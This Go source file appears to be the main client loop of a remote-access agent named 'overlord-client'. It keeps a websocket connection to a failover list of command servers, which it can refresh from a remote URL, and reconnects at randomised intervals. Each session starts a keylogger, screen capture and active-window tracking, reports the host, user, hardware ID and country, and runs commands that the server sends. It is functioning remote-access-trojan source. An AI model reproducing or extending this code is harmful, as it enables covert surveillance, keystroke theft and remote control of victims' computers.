package main

import (
	"context"
	"crypto/tls"
	"crypto/x509"
	"errors"
	"fmt"
	"log"
	"math/rand"
	"net/http"
	"os"
	"runtime"
	"runtime/debug"
	"strconv"
	"strings"
	"time"

	"overlord-client/cmd/agent/activewindow"
	"overlord-client/cmd/agent/capture"
	"overlord-client/cmd/agent/config"
	"overlord-client/cmd/agent/handlers"
	"overlord-client/cmd/agent/keylogger"
	"overlord-client/cmd/agent/plugins"
	rt "overlord-client/cmd/agent/runtime"
	"overlord-client/cmd/agent/wire"

	"nhooyr.io/websocket"
)

func runClient(cfg config.Config) {
	baseBackoff := computeBaseBackoff()
	backoff := baseBackoff
	log.Printf("runtime GOOS=%s GOARCH=%s cfg.OS=%s cfg.Arch=%s", runtime.GOOS, runtime.GOARCH, cfg.OS, cfg.Arch)

	ensureServerURLs(&cfg, baseBackoff)

	if len(cfg.ServerURLs) > 1 {
		log.Printf("Failover enabled with %d servers:", len(cfg.ServerURLs))
		for i, url := range cfg.ServerURLs {
			marker := ""
			if i == cfg.ServerIndex {
				marker = " (starting here)"
			}
			log.Printf("  [%d] %s%s", i, url, marker)
		}
	}

	tlsMinVersion := uint16(tls.VersionTLS12)
	transport := createHTTPTransport(cfg, tlsMinVersion)
	currentIndex := cfg.ServerIndex
	consecutiveFailures := 0
	// idek how tf to fix this. sometimes the client just says fuck you and downgrades then stops connections.
	allowTLSDowngrade := false

	for {

		if currentIndex >= len(cfg.ServerURLs) {
			currentIndex = 0
		}

		currentServer := cfg.ServerURLs[currentIndex]
		ctx, cancel := context.WithCancel(context.Background())
		url := fmt.Sprintf("%s/api/clients/%s/stream/ws?role=client", currentServer, cfg.ID)

		opts := buildDialOptions(cfg, transport)

		serverInfo := ""
		if len(cfg.ServerURLs) > 1 {
			serverInfo = fmt.Sprintf(" [%d/%d]", currentIndex+1, len(cfg.ServerURLs))
		}
		log.Printf("connecting to %s%s (TLS verify: %v)", currentServer, serverInfo, !cfg.TLSInsecureSkipVerify)

		conn, _, err := websocket.Dial(ctx, url, opts)
		if err != nil {
			log.Printf("dial failed: %v (retrying in %s)", err, backoff)
			consecutiveFailures++

			if shouldRefreshRawList(cfg, consecutiveFailures) {
				if refreshServerURLsFromRaw(&cfg) {
					currentIndex = 0
					consecutiveFailures = 0
				}
			}

			if len(cfg.ServerURLs) > 1 {
				currentIndex = (currentIndex + 1) % len(cfg.ServerURLs)
				log.Printf("switching to next server [%d/%d]: %s", currentIndex+1, len(cfg.ServerURLs), cfg.ServerURLs[currentIndex])
			}

			time.Sleep(backoff)
			cancel()
			continue
		}

		if currentIndex != cfg.ServerIndex {
			if err := config.SaveServerIndex(currentIndex); err != nil {
				log.Printf("Warning: failed to save server index: %v", err)
			}
		}

		backoff = baseBackoff
		consecutiveFailures = 0
		log.Printf("connected successfully to %s%s", currentServer, serverInfo)

		conn.SetReadLimit(8 * 1024 * 1024)

		var sessionErr error
		if err := runSession(ctx, cancel, conn, cfg); err != nil {
			sessionErr = err
			if allowTLSDowngrade && isTLSVersionError(err) {
				log.Printf("[TLS] remote rejected TLS version; downgrading to TLS 1.0 for compatibility")
				tlsMinVersion = uint16(tls.VersionTLS10)
				transport = createHTTPTransport(cfg, tlsMinVersion)
				allowTLSDowngrade = false
			}
			log.Printf("session ended: %v (retrying in %s)", err, backoff)

			if shouldRefreshRawList(cfg, len(cfg.ServerURLs)) {
				if refreshServerURLsFromRaw(&cfg) {
					currentIndex = 0
					consecutiveFailures = 0
				}
			}

			if len(cfg.ServerURLs) > 1 {
				currentIndex = (currentIndex + 1) % len(cfg.ServerURLs)
				log.Printf("switching to next server [%d/%d]: %s", currentIndex+1, len(cfg.ServerURLs), cfg.ServerURLs[currentIndex])
			}
		}

		sleepFor := backoff
		if sessionErr != nil && shouldRetryImmediately(sessionErr) {
			sleepFor = reconnectDelay()
			log.Printf("reconnect: immediate retry in %s", sleepFor)
		}
		time.Sleep(sleepFor)
	}
}

func buildDialOptions(cfg config.Config, transport *http.Transport) *websocket.DialOptions {
	headers := http.Header{}
	if token := strings.TrimSpace(cfg.AgentToken); token != "" {
		headers.Set("x-agent-token", token)
	}
	return &websocket.DialOptions{
		Subprotocols:    []string{"binary"},
		HTTPClient:      &http.Client{Transport: transport},
		HTTPHeader:      headers,
		CompressionMode: websocket.CompressionContextTakeover,
	}
}

func ensureServerURLs(cfg *config.Config, backoff time.Duration) {
	if len(cfg.ServerURLs) > 0 {
		return
	}

	if cfg.RawServerListURL == "" {
		log.Printf("[config] WARNING: no server URLs configured; falling back to default %s", config.DefaultServerURL)
		cfg.ServerURLs = []string{config.DefaultServerURL}
		return
	}

	log.Printf("No server URLs configured. Fetching raw list from %s", cfg.RawServerListURL)
	for len(cfg.ServerURLs) == 0 {
		if refreshServerURLsFromRaw(cfg) {
			return
		}
		log.Printf("Retrying raw server list fetch in %s", backoff)
		time.Sleep(backoff)
	}
}

func shouldRefreshRawList(cfg config.Config, failures int) bool {
	if cfg.RawServerListURL == "" {
		return false
	}
	if len(cfg.ServerURLs) == 0 {
		return true
	}
	return failures >= len(cfg.ServerURLs)
}

func refreshServerURLsFromRaw(cfg *config.Config) bool {
	urls, err := config.LoadServerURLsFromRaw(cfg.RawServerListURL)
	if err != nil {
		log.Printf("[config] WARNING: failed to refresh raw server list: %v", err)
		return false
	}

	if len(urls) == 0 {
		log.Printf("[config] WARNING: raw server list returned no URLs")
		return false
	}

	if !equalStringSlices(cfg.ServerURLs, urls) {
		log.Printf("[config] refreshed raw server list (%d servers)", len(urls))
		cfg.ServerURLs = urls
	}
	return true
}

func equalStringSlices(a, b []string) bool {
	if len(a) != len(b) {
		return false
	}
	for i := range a {
		if a[i] != b[i] {
			return false
		}
	}
	return true
}

func createHTTPTransport(cfg config.Config, minVersion uint16) *http.Transport {
	tlsConfig := &tls.Config{
		InsecureSkipVerify: cfg.TLSInsecureSkipVerify,
		MinVersion:         minVersion,
	}

	if cfg.TLSCAPath != "" {
		caCert, err := os.ReadFile(cfg.TLSCAPath)
		if err != nil {
			log.Printf("[TLS] WARNING: Failed to read CA certificate from %s: %v", cfg.TLSCAPath, err)
		} else {
			caCertPool := x509.NewCertPool()
			if caCertPool.AppendCertsFromPEM(caCert) {
				tlsConfig.RootCAs = caCertPool
				log.Printf("[TLS] Loaded custom CA certificate from %s", cfg.TLSCAPath)
			} else {
				log.Printf("[TLS] WARNING: Failed to parse CA certificate from %s", cfg.TLSCAPath)
			}
		}
	}

	if cfg.TLSClientCert != "" && cfg.TLSClientKey != "" {
		cert, err := tls.LoadX509KeyPair(cfg.TLSClientCert, cfg.TLSClientKey)
		if err != nil {
			log.Printf("[TLS] WARNING: Failed to load client certificate: %v", err)
		} else {
			tlsConfig.Certificates = []tls.Certificate{cert}
			log.Printf("[TLS] Loaded client certificate for mutual TLS")
		}
	}

	if cfg.TLSInsecureSkipVerify {
		log.Printf("[TLS] WARNING: Certificate verification is DISABLED. This is insecure!")
	}

	transport := http.DefaultTransport.(*http.Transport).Clone()
	transport.TLSClientConfig = tlsConfig
	return transport
}

func isTLSVersionError(err error) bool {
	if err == nil {
		return false
	}
	msg := strings.ToLower(err.Error())
	return strings.Contains(msg, "protocol version not supported") ||
		strings.Contains(msg, "tls: protocol version not supported")
}

func computeBaseBackoff() time.Duration {
	mode := strings.ToLower(strings.TrimSpace(os.Getenv("OVERLORD_MODE")))
	_ = mode
	return randomReconnectDelay(10*time.Second, 30*time.Second)
}

func reconnectDelay() time.Duration {
	raw := strings.TrimSpace(os.Getenv("OVERLORD_RECONNECT_DELAY_MS"))
	if raw == "" {
		return randomReconnectDelay(10*time.Second, 30*time.Second)
	}
	ms, err := strconv.Atoi(raw)
	if err != nil || ms < 0 {
		log.Printf("[reconnect] invalid OVERLORD_RECONNECT_DELAY_MS=%q, using 10-30s", raw)
		return randomReconnectDelay(10*time.Second, 30*time.Second)
	}
	if ms == 0 {
		return 0
	}
	return time.Duration(ms) * time.Millisecond
}

var reconnectRng = rand.New(rand.NewSource(time.Now().UnixNano()))

func randomReconnectDelay(min, max time.Duration) time.Duration {
	if max <= min {
		return min
	}
	delta := max - min
	n := time.Duration(reconnectRng.Int63n(int64(delta) + 1))
	return min + n
}

func shouldRetryImmediately(err error) bool {
	if err == nil {
		return false
	}
	if errors.Is(err, handlers.ErrReconnect) {
		return true
	}
	var closeErr *websocket.CloseError
	if errors.As(err, &closeErr) {
		if closeErr.Code == websocket.StatusNormalClosure || closeErr.Code == websocket.StatusGoingAway {
			return true
		}
		if closeErr.Code == websocket.StatusAbnormalClosure {
			return true
		}
	}
	msg := strings.ToLower(err.Error())
	if strings.Contains(msg, "timed out from inactivity") {
		return true
	}
	return false
}

func getPingInterval() time.Duration {
	raw := strings.TrimSpace(os.Getenv("OVERLORD_PING_INTERVAL_MS"))
	if raw == "" {
		return 30 * time.Second
	}
	ms, err := strconv.Atoi(raw)
	if err != nil {
		log.Printf("[ping] invalid OVERLORD_PING_INTERVAL_MS=%q, using 30000ms", raw)
		return 30 * time.Second
	}
	if ms <= 0 {
		return 0
	}
	return time.Duration(ms) * time.Millisecond
}

func runSession(ctx context.Context, cancel context.CancelFunc, conn *websocket.Conn, cfg config.Config) (err error) {
	defer func() {
		if r := recover(); r != nil {
			reason := fmt.Sprintf("session panic: %v", r)
			stack := debug.Stack()
			path := writeCrashLog(reason, stack)
			log.Printf("%s (see %s)", reason, path)
			err = fmt.Errorf("session panic: %v", r)
		}
	}()
	defer cancel()
	defer conn.Close(websocket.StatusNormalClosure, "bye")

	safeWriter := wire.NewSafeWriter(conn)
	env := &rt.Env{Conn: safeWriter, Cfg: cfg, Cancel: cancel, SelectedDisplay: handlers.GetPersistedDisplay()}
	env.SetLastPong(time.Now().UnixMilli())
	env.Console = rt.NewConsoleHub(env)
	env.Plugins = plugins.NewManager(env.Conn, plugins.HostInfo{ClientID: cfg.ID, OS: cfg.OS, Arch: cfg.Arch, Version: cfg.Version})
	defer env.Plugins.Close()

	env.Keylogger = keylogger.New()
	if err := env.Keylogger.Start(); err != nil {
		log.Printf("[keylogger] Failed to start: %v", err)
	} else {
		defer env.Keylogger.Stop()
	}

	dispatcher := handlers.NewDispatcher(env)

	osVal := strings.TrimSpace(cfg.OS)
	if osVal == "" {
		osVal = runtime.GOOS
	}

	archVal := strings.TrimSpace(cfg.Arch)
	if archVal == "" {
		archVal = runtime.GOARCH
	}

	hello := wire.Hello{
		Type:        "hello",
		ID:          cfg.ID,
		HWID:        cfg.HWID,
		Host:        rt.Hostname(),
		OS:          osVal,
		Arch:        archVal,
		Version:     cfg.Version,
		User:        rt.CurrentUser(),
		Monitors:    capture.MonitorCount(),
		MonitorInfo: toWireMonitorInfo(capture.MonitorInfos()),
		Country:     cfg.Country,
	}

	if err := wire.WriteMsg(ctx, env.Conn, hello); err != nil {
		return fmt.Errorf("send hello: %w", err)
	}

	if err := wire.WriteMsg(ctx, env.Conn, wire.Ping{Type: "ping", TS: time.Now().UnixMilli()}); err != nil {
		log.Printf("ping: failed to send initial ping: %v", err)
		cancel()
		return fmt.Errorf("send initial ping: %w", err)
	}

	if interval := getPingInterval(); interval > 0 {
		log.Printf("ping: heartbeat interval=%s", interval)
		goSafe("ping loop", cancel, func() {
			ticker := time.NewTicker(interval)
			defer ticker.Stop()
			for {
				select {
				case <-ctx.Done():
					return
				case <-ticker.C:
					ping := wire.Ping{Type: "ping", TS: time.Now().UnixMilli()}
					if err := wire.WriteMsg(ctx, env.Conn, ping); err != nil {
						log.Printf("ping: failed to send: %v", err)
						cancel()
						return
					}
				}
			}
		})
		goSafe("pong watchdog", cancel, func() {
			grace := interval + (10 * time.Second)
			if grace < 20*time.Second {
				grace = 20 * time.Second
			}
			ticker := time.NewTicker(interval)
			defer ticker.Stop()
			for {
				select {
				case <-ctx.Done():
					return
				case <-ticker.C:
					last := env.LastPong()
					if !last.IsZero() && time.Since(last) > grace {
						log.Printf("ping: no pong for %s, forcing reconnect", time.Since(last))
						cancel()
						return
					}
				}
			}
		})
	}

	readErr := make(chan error, 1)
	go func() {
		defer func() {
			if r := recover(); r != nil {
				reason := fmt.Sprintf("readLoop panic: %v", r)
				stack := debug.Stack()
				path := writeCrashLog(reason, stack)
				log.Printf("%s (see %s)", reason, path)
				err := fmt.Errorf("%s", reason)
				select {
				case readErr <- err:
				default:
				}
				cancel()
			}
		}()

		if err := readLoop(ctx, conn, env, dispatcher); err != nil {
			log.Printf("readLoop ended: %v", err)
			select {
			case readErr <- err:
			default:
			}
			cancel()
		}
	}()

	shotCtx, cancelShots := context.WithCancel(ctx)
	defer cancelShots()
	goSafe("capture loop", cancel, func() {
		capture.Loop(shotCtx, env)
	})

	goSafe("activewindow", nil, func() {
		if err := activewindow.Start(ctx, env); err != nil {
			log.Printf("activewindow error: %v", err)
		}
	})

	return <-readErr
}

func toWireMonitorInfo(infos []capture.MonitorInfo) []wire.MonitorInfo {
	if len(infos) == 0 {
		return nil
	}
	out := make([]wire.MonitorInfo, 0, len(infos))
	for _, info := range infos {
		out = append(out, wire.MonitorInfo{Width: info.Width, Height: info.Height})
	}
	return out
}

func readLoop(ctx context.Context, conn *websocket.Conn, env *rt.Env, dispatcher *handlers.Dispatcher) error {
	for {
		_, data, err := conn.Read(ctx)
		if err != nil {
			if ctx.Err() != nil {
				return err
			}
			log.Printf("readLoop: read error: %v", err)
			return err
		}
		envelope, err := wire.DecodeEnvelope(data)
		if err != nil {
			log.Printf("decode: %v (bytes=%d)", err, len(data))
			continue
		}
		if err := dispatcher.Dispatch(ctx, envelope); err != nil {
			log.Printf("dispatcher error: %v (type=%v)", err, envelope["type"])
			return err
		}
	}
}
